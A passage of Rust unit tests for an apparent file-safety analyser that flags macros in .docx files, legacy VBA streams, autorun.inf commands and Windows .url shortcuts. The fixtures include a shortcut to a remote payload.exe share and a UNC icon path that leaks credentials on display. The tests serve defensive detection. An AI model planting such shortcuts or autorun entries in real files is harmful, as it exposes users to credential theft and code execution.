            "word/styles.xml",
            "docProps/core.xml",
        ]);
        let res = analyse(&doc, "quarterly-report.docx").unwrap();
        assert!(!res.flagged, "clean .docx flagged: {:?}", res.flags);
    }

    /// The `x` in `.docx` means "no macros". A .docx carrying one contradicts
    /// its own format — this is not a judgement call.
    #[test]
    fn macro_in_a_macro_free_format_is_critical() {
        let doc = build_ooxml(&[
            "[Content_Types].xml",
            "word/document.xml",
            "word/vbaProject.bin",
        ]);
        let res = analyse(&doc, "invoice.docx").unwrap();
        assert!(res.flagged);
        assert!(res.risk >= 0.75, "risk was {}", res.risk);
        assert!(
            res.findings
                .iter()
                .any(|f| f.title.contains("not allowed to have them")),
            "{:?}",
            res.findings
        );
    }

    /// A .docm declaring its macros is doing what it says. Still reported —
    /// macros are the main Office attack vector — but not treated as a lie.
    #[test]
    fn macro_in_a_declared_macro_format_is_reported_not_condemned() {
        let doc = build_ooxml(&["word/document.xml", "word/vbaProject.bin"]);
        let declared = analyse(&doc, "budget.docm").unwrap();
        let undeclared = analyse(&doc, "budget.docx").unwrap();

        assert!(declared.flagged, "macros should always be reported");
        assert!(
            declared.risk < undeclared.risk,
            "a declared macro ({}) must score below a concealed one ({})",
            declared.risk,
            undeclared.risk
        );
    }

    #[test]
    fn legacy_ole_macros_are_detected() {
        let mut d = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1".to_vec();
        d.extend(std::iter::repeat_n(0u8, 512));
        for s in ["VBA", "_VBA_PROJECT"] {
            for b in s.bytes() {
                d.push(b);
                d.push(0);
            }
            d.extend([0u8; 16]);
        }
        let res = analyse(&d, "old-report.doc").unwrap();
        assert!(
            res.findings.iter().any(|f| f.title.contains("macros")),
            "legacy macro stream missed: {:?}",
            res.findings
        );
    }

    // --- autorun.inf and internet shortcuts ---------------------------------

    #[test]
    fn autorun_inf_naming_a_command_is_flagged() {
        let res = analyse(b"[autorun]\r\nopen=setup.exe\r\nicon=setup.exe", "autorun.inf").unwrap();
        assert!(res.flagged);
        assert!(res.risk >= 0.7);
        assert!(res.executes_on_open);
    }

    #[test]
    fn autorun_inside_a_container_is_flagged() {
        let iso = build_ooxml(&["autorun.inf", "setup.exe", "data.bin"]);
        let res = analyse(&iso, "software.zip").unwrap();
        assert!(
            res.findings
                .iter()
                .any(|f| f.title.contains("instruction to run something")),
            "{:?}",
            res.findings
        );
    }

    #[test]
    fn url_shortcut_to_a_remote_share_is_flagged() {
        let res = analyse(
            b"[InternetShortcut]\r\nURL=file://192.0.2.10/share/payload.exe\r\n",
            "document.url",
        )
        .unwrap();
        assert!(res.risk >= 0.7, "risk was {}", res.risk);
        assert!(
            res.findings.iter().any(|f| f.title.contains("another machine")),
            "{:?}",
            res.findings
        );
    }

    /// No click required: Explorer resolves the icon path to draw the file.
    #[test]
    fn url_shortcut_with_a_unc_icon_is_flagged_as_credential_theft() {
        let res = analyse(
            b"[InternetShortcut]\r\nURL=https://example.com/\r\nIconFile=\\\\192.0.2.10\\x\\i.ico\r\n",
            "news.url",
        )
        .unwrap();
        assert!(
            res.findings
                .iter()
                .any(|f| f.title.contains("just by being displayed")),
            "{:?}",
            res.findings
        );
        assert!(res.risk >= 0.75);
    }

    #[test]
    fn ordinary_url_shortcut_is_not_flagged_as_an_attack() {
        let res = analyse(
            b"[InternetShortcut]\r\nURL=https://example.com/article\r\n",
            "article.url",
        )
        .unwrap();
        assert!(
            !res.findings.iter().any(|f| f.title.contains("another machine")),
            "ordinary web shortcut wrongly accused: {:?}",
            res.findings
        );
        assert!(res.risk <= 0.45);
    }

    #[test]
    fn hostile_input_never_panics() {
        let inputs: Vec<Vec<u8>> = vec![
            vec![],
            vec![0u8; 1],
            vec![0xFFu8; 5000],
            b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1".to_vec(),
            b"PK\x03\x04".to_vec(),
            b"[InternetShortcut]\r\nURL=".to_vec(),
            b"=".to_vec(),
        ];
        for data in &inputs {
            for name in ["", ".", "..", "x.lnk", "x.url", "autorun.inf", "a.docx", "x"] {
                let _ = analyse(data, name).unwrap();
            }
        }
    }
}
